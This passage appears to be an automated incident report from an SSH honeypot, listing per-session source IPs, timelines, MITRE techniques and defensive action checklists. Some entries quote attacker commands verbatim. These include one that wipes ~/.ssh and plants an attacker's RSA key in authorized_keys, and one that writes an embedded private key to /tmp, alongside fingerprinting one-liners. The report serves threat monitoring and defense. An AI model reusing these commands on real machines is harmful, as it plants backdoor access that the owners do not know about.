| **Source IP** | `190.6.32[.]107` |
| **First Seen** | 2026-08-16 16:07 |
| **Last Seen** | 2026-08-16 16:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:07:07` | `cowrie.session.connect` |
| `2026-08-16 16:07:07` | `cowrie.client.version` |
| `2026-08-16 16:07:07` | `cowrie.client.kex` |
| `2026-08-16 16:07:07` | `cowrie.login.success` |
| `2026-08-16 16:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.6.32[.]107` to AbuseIPDB if not already reported
- [ ] Block `190.6.32[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3ebe5d16247

| Field | Detail |
|---|---|
| **Source IP** | `190.6.32[.]107` |
| **First Seen** | 2026-08-16 16:07 |
| **Last Seen** | 2026-08-16 16:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:07:07` | `cowrie.session.connect` |
| `2026-08-16 16:07:07` | `cowrie.client.version` |
| `2026-08-16 16:07:08` | `cowrie.client.kex` |
| `2026-08-16 16:07:08` | `cowrie.login.success` |
| `2026-08-16 16:07:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.6.32[.]107` to AbuseIPDB if not already reported
- [ ] Block `190.6.32[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-930c93d142f6

| Field | Detail |
|---|---|
| **Source IP** | `223.85.251[.]55` |
| **First Seen** | 2026-08-16 16:08 |
| **Last Seen** | 2026-08-16 16:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:08:15` | `cowrie.session.connect` |
| `2026-08-16 16:08:15` | `cowrie.client.version` |
| `2026-08-16 16:08:15` | `cowrie.client.kex` |
| `2026-08-16 16:08:16` | `cowrie.login.success` |
| `2026-08-16 16:08:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.85.251[.]55` to AbuseIPDB if not already reported
- [ ] Block `223.85.251[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f94097d1f90

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-16 16:08 |
| **Last Seen** | 2026-08-16 16:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:08:17` | `cowrie.session.connect` |
| `2026-08-16 16:08:17` | `cowrie.client.version` |
| `2026-08-16 16:08:18` | `cowrie.client.kex` |
| `2026-08-16 16:08:18` | `cowrie.login.success` |
| `2026-08-16 16:08:20` | `cowrie.session.params` |
| `2026-08-16 16:08:20` | `cowrie.command.input` |
| `2026-08-16 16:08:20` | `cowrie.session.file_download` |
| `2026-08-16 16:08:20` | `cowrie.session.file_download` |
| `2026-08-16 16:08:20` | `cowrie.log.closed` |
| `2026-08-16 16:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb9b7a3f8ca7

| Field | Detail |
|---|---|
| **Source IP** | `45.195.221[.]26` |
| **First Seen** | 2026-08-16 16:09 |
| **Last Seen** | 2026-08-16 16:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:09:32` | `cowrie.session.connect` |
| `2026-08-16 16:09:32` | `cowrie.client.version` |
| `2026-08-16 16:09:32` | `cowrie.client.kex` |
| `2026-08-16 16:09:33` | `cowrie.login.success` |
| `2026-08-16 16:09:34` | `cowrie.session.params` |
| `2026-08-16 16:09:34` | `cowrie.command.input` |
| `2026-08-16 16:09:34` | `cowrie.command.failed` |
| `2026-08-16 16:09:34` | `cowrie.log.closed` |
| `2026-08-16 16:09:35` | `cowrie.session.params` |
| `2026-08-16 16:09:35` | `cowrie.command.input` |
| `2026-08-16 16:09:35` | `cowrie.session.file_download` |
| `2026-08-16 16:09:35` | `cowrie.log.closed` |
| `2026-08-16 16:09:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.195.221[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.195.221[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-608a68a3c68e

| Field | Detail |
|---|---|
| **Source IP** | `45.195.221[.]26` |
| **First Seen** | 2026-08-16 16:09 |
| **Last Seen** | 2026-08-16 16:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:09:35` | `cowrie.session.connect` |
| `2026-08-16 16:09:35` | `cowrie.client.version` |
| `2026-08-16 16:09:35` | `cowrie.client.kex` |
| `2026-08-16 16:09:36` | `cowrie.login.success` |
| `2026-08-16 16:09:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.195.221[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.195.221[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-548e467474ef

| Field | Detail |
|---|---|
| **Source IP** | `45.195.221[.]26` |
| **First Seen** | 2026-08-16 16:09 |
| **Last Seen** | 2026-08-16 16:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:09:36` | `cowrie.session.connect` |
| `2026-08-16 16:09:36` | `cowrie.client.version` |
| `2026-08-16 16:09:36` | `cowrie.client.kex` |
| `2026-08-16 16:09:37` | `cowrie.login.success` |
| `2026-08-16 16:09:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.195.221[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.195.221[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c4e695798d2

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 16:15 |
| **Last Seen** | 2026-08-16 16:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:15:58` | `cowrie.session.connect` |
| `2026-08-16 16:15:58` | `cowrie.client.version` |
| `2026-08-16 16:15:58` | `cowrie.client.kex` |
| `2026-08-16 16:15:59` | `cowrie.login.success` |
| `2026-08-16 16:16:00` | `cowrie.session.params` |
| `2026-08-16 16:16:00` | `cowrie.command.input` |
| `2026-08-16 16:16:00` | `cowrie.log.closed` |
| `2026-08-16 16:16:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb7cd1ead752

| Field | Detail |
|---|---|
| **Source IP** | `78.189.17[.]35` |
| **First Seen** | 2026-08-16 16:17 |
| **Last Seen** | 2026-08-16 16:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:17:28` | `cowrie.session.connect` |
| `2026-08-16 16:17:29` | `cowrie.client.version` |
| `2026-08-16 16:17:29` | `cowrie.client.kex` |
| `2026-08-16 16:17:30` | `cowrie.login.success` |
| `2026-08-16 16:17:30` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:17:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.189.17[.]35` to AbuseIPDB if not already reported
- [ ] Block `78.189.17[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-178b23f7edba

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 16:19 |
| **Last Seen** | 2026-08-16 16:19 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:19:00` | `cowrie.session.connect` |
| `2026-08-16 16:19:05` | `cowrie.client.version` |
| `2026-08-16 16:19:05` | `cowrie.client.kex` |
| `2026-08-16 16:19:28` | `cowrie.login.success` |
| `2026-08-16 16:19:40` | `cowrie.session.params` |
| `2026-08-16 16:19:40` | `cowrie.command.input` |
| `2026-08-16 16:19:46` | `cowrie.log.closed` |
| `2026-08-16 16:19:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffb3813ac545

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-08-16 16:21 |
| **Last Seen** | 2026-08-16 16:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:21:38` | `cowrie.session.connect` |
| `2026-08-16 16:21:39` | `cowrie.client.version` |
| `2026-08-16 16:21:39` | `cowrie.client.kex` |
| `2026-08-16 16:21:41` | `cowrie.login.success` |
| `2026-08-16 16:21:42` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec153ec7dfe2

| Field | Detail |
|---|---|
| **Source IP** | `211.253.10[.]61` |
| **First Seen** | 2026-08-16 16:21 |
| **Last Seen** | 2026-08-16 16:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:21:48` | `cowrie.session.connect` |
| `2026-08-16 16:21:49` | `cowrie.client.version` |
| `2026-08-16 16:21:49` | `cowrie.client.kex` |
| `2026-08-16 16:21:51` | `cowrie.login.success` |
| `2026-08-16 16:21:52` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:21:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `211.253.10[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afeed2d43caf

| Field | Detail |
|---|---|
| **Source IP** | `175.206.1[.]60` |
| **First Seen** | 2026-08-16 16:22 |
| **Last Seen** | 2026-08-16 16:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:22:28` | `cowrie.session.connect` |
| `2026-08-16 16:22:29` | `cowrie.client.version` |
| `2026-08-16 16:22:29` | `cowrie.client.kex` |
| `2026-08-16 16:22:31` | `cowrie.login.success` |
| `2026-08-16 16:22:32` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:22:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.206.1[.]60` to AbuseIPDB if not already reported
- [ ] Block `175.206.1[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-838f5145763d

| Field | Detail |
|---|---|
| **Source IP** | `61.2.228[.]177` |
| **First Seen** | 2026-08-16 16:22 |
| **Last Seen** | 2026-08-16 16:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:22:37` | `cowrie.session.connect` |
| `2026-08-16 16:22:38` | `cowrie.client.version` |
| `2026-08-16 16:22:38` | `cowrie.client.kex` |
| `2026-08-16 16:22:40` | `cowrie.login.success` |
| `2026-08-16 16:22:41` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:22:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.2.228[.]177` to AbuseIPDB if not already reported
- [ ] Block `61.2.228[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddc7a7940c7b

| Field | Detail |
|---|---|
| **Source IP** | `183.167.217[.]86` |
| **First Seen** | 2026-08-16 16:22 |
| **Last Seen** | 2026-08-16 16:22 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:22:42` | `cowrie.session.connect` |
| `2026-08-16 16:22:43` | `cowrie.client.version` |
| `2026-08-16 16:22:43` | `cowrie.client.kex` |
| `2026-08-16 16:22:46` | `cowrie.login.success` |
| `2026-08-16 16:22:47` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.167.217[.]86` to AbuseIPDB if not already reported
- [ ] Block `183.167.217[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fe9fedd541d

| Field | Detail |
|---|---|
| **Source IP** | `68.7.114[.]69` |
| **First Seen** | 2026-08-16 16:22 |
| **Last Seen** | 2026-08-16 16:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:22:43` | `cowrie.session.connect` |
| `2026-08-16 16:22:44` | `cowrie.client.version` |
| `2026-08-16 16:22:44` | `cowrie.client.kex` |
| `2026-08-16 16:22:45` | `cowrie.login.success` |
| `2026-08-16 16:22:45` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:22:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.7.114[.]69` to AbuseIPDB if not already reported
- [ ] Block `68.7.114[.]69` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b519bce4c60

| Field | Detail |
|---|---|
| **Source IP** | `65.20.175[.]6` |
| **First Seen** | 2026-08-16 16:22 |
| **Last Seen** | 2026-08-16 16:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:22:51` | `cowrie.session.connect` |
| `2026-08-16 16:22:52` | `cowrie.client.version` |
| `2026-08-16 16:22:52` | `cowrie.client.kex` |
| `2026-08-16 16:22:53` | `cowrie.login.success` |
| `2026-08-16 16:22:54` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:22:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.175[.]6` to AbuseIPDB if not already reported
- [ ] Block `65.20.175[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa245a91df19

| Field | Detail |
|---|---|
| **Source IP** | `220.80.223[.]144` |
| **First Seen** | 2026-08-16 16:22 |
| **Last Seen** | 2026-08-16 16:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:22:53` | `cowrie.session.connect` |
| `2026-08-16 16:22:54` | `cowrie.client.version` |
| `2026-08-16 16:22:54` | `cowrie.client.kex` |
| `2026-08-16 16:22:57` | `cowrie.login.success` |
| `2026-08-16 16:22:57` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.223[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.80.223[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-436b833afcce

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 16:35 |
| **Last Seen** | 2026-08-16 16:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:35:06` | `cowrie.session.connect` |
| `2026-08-16 16:35:06` | `cowrie.client.version` |
| `2026-08-16 16:35:06` | `cowrie.client.kex` |
| `2026-08-16 16:35:06` | `cowrie.login.success` |
| `2026-08-16 16:35:07` | `cowrie.session.params` |
| `2026-08-16 16:35:07` | `cowrie.command.input` |
| `2026-08-16 16:35:08` | `cowrie.log.closed` |
| `2026-08-16 16:35:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-316da2ba99f6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 16:35 |
| **Last Seen** | 2026-08-16 16:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:35:20` | `cowrie.session.connect` |
| `2026-08-16 16:35:21` | `cowrie.client.version` |
| `2026-08-16 16:35:21` | `cowrie.client.kex` |
| `2026-08-16 16:35:23` | `cowrie.login.success` |
| `2026-08-16 16:35:25` | `cowrie.session.params` |
| `2026-08-16 16:35:25` | `cowrie.command.input` |
| `2026-08-16 16:35:25` | `cowrie.command.input` |
| `2026-08-16 16:35:25` | `cowrie.command.input` |
| `2026-08-16 16:35:25` | `cowrie.command.input` |
| `2026-08-16 16:35:25` | `cowrie.command.input` |
| `2026-08-16 16:35:25` | `cowrie.command.success` |
| `2026-08-16 16:35:25` | `cowrie.command.input` |
| `2026-08-16 16:35:25` | `cowrie.command.input` |
| `2026-08-16 16:35:25` | `cowrie.command.input` |
| `2026-08-16 16:35:25` | `cowrie.command.input` |
| `2026-08-16 16:35:26` | `cowrie.log.closed` |
| `2026-08-16 16:35:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45a47c0d7c87

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-16 16:36 |
| **Last Seen** | 2026-08-16 16:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:36:27` | `cowrie.session.connect` |
| `2026-08-16 16:36:27` | `cowrie.client.version` |
| `2026-08-16 16:36:27` | `cowrie.client.kex` |
| `2026-08-16 16:36:27` | `cowrie.login.success` |
| `2026-08-16 16:36:27` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:36:28` | `cowrie.direct-tcpip.data` |
| `2026-08-16 16:36:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c19d734c42b2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 16:37 |
| **Last Seen** | 2026-08-16 16:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:37:16` | `cowrie.session.connect` |
| `2026-08-16 16:37:17` | `cowrie.client.version` |
| `2026-08-16 16:37:17` | `cowrie.client.kex` |
| `2026-08-16 16:37:19` | `cowrie.login.success` |
| `2026-08-16 16:37:21` | `cowrie.session.params` |
| `2026-08-16 16:37:21` | `cowrie.command.input` |
| `2026-08-16 16:37:21` | `cowrie.command.input` |
| `2026-08-16 16:37:21` | `cowrie.command.input` |
| `2026-08-16 16:37:21` | `cowrie.command.input` |
| `2026-08-16 16:37:21` | `cowrie.command.input` |
| `2026-08-16 16:37:21` | `cowrie.command.success` |
| `2026-08-16 16:37:21` | `cowrie.command.input` |
| `2026-08-16 16:37:21` | `cowrie.command.input` |
| `2026-08-16 16:37:21` | `cowrie.command.input` |
| `2026-08-16 16:37:21` | `cowrie.command.input` |
| `2026-08-16 16:37:22` | `cowrie.log.closed` |
| `2026-08-16 16:37:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3f798d2fbf8

| Field | Detail |
|---|---|
| **Source IP** | `1.247.245[.]61` |
